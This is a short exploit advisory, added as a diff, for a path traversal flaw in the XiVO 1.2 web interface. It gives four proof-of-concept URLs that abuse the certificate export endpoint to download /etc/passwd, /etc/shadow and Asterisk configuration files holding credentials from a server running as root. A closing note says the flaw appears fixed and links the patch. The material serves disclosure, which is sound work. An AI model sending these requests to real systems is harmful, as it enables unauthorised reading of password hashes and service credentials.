@@ -1,0 +1,26 @@
+Xivo 1.2 Arbitrary File Download under root privileges
+===============================================================
+
+Date: 6/11/2012
+Exploit Author: Mr.Un1k0d3r
+Vendor Homepage: https://wiki.xivo.fr
+Software Link: https://wiki.xivo.fr/index.php/XiVO_1.1-Gallifrey/Install_XiVO_With_CD
+Version: 1.2 (last patched version)
+Tested on: Linux xivo 2.6.32-5-486
+
+Exploit:
+Using the web interface you can download any file from the system. The web application is running under root privileges. 
+You can download clear text password, /etc/passwd, /etc/shadow and many more...
+
+POC:
+https://server-ip/xivo/configuration/index.php/manage/certificate/?act=export&id=../../../../etc/passwd
+https://server-ip/xivo/configuration/index.php/manage/certificate/?act=export&id=../../../../etc/shadow 
+https://server-ip/xivo/configuration/index.php/manage/certificate/?act=export&id=../../../../etc/asterisk/manager.conf
+https://server-ip/xivo/configuration/index.php/manage/certificate/?act=export&id=../../../../etc/asterisk/cel_pgsql.conf
+
+This vulnerability was discover by Mr.Un1k0d3r From RingZer0 Team.
+
+Exploit-DB Note:
+This appears to have been fixed
+https://projects.xivo.fr/issues/3912
+http://git.xivo.fr/?p=official/xivo-skaro.git;a=commit;h=127ab43e6d8e8ed94f16ff388fb62fd611a40e19
